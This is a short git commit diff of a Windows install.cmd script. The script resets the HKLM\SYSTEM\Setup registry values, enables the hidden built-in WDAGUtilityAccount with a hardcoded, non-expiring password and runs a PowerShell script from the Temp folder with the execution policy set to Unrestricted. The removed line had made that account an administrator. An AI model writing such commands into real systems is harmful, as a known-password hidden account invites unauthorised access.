a25e32d30f32dec0b1db9b575084b5e789619061
Babygrill 🍵 <moaug@proton.me>
2024-09-25 22:06:36 +0200

    Update install.cmd

--- install.cmd
+++ install.cmd
@@ -1,9 +1,9 @@
-net user WDAGUtilityAccount /active:yes
-wmic UserAccount where Name='WDAGUtilityAccount' set PasswordExpires=False
-net user WDAGUtilityAccount ax-sys-tool
-net localgroup Administrators /add WDAGUtilityAccount
 reg delete "HKLM\SYSTEM\Setup" /v CmdLine /f
 reg add "HKLM\SYSTEM\Setup" /v CmdLine /t REG_SZ /d ""
 reg delete "HKLM\SYSTEM\Setup" /v SetupType /f
 reg add "HKLM\SYSTEM\Setup" /v SetupType /t REG_DWORD /d 0
+net user WDAGUtilityAccount /active:yes
+wmic UserAccount where Name='WDAGUtilityAccount' set PasswordExpires=False
+net user WDAGUtilityAccount ax-sys-tool
+powershell.exe -ExecutionPolicy Unrestricted -File "C:\Windows\Temp\install.ps1"
 exit
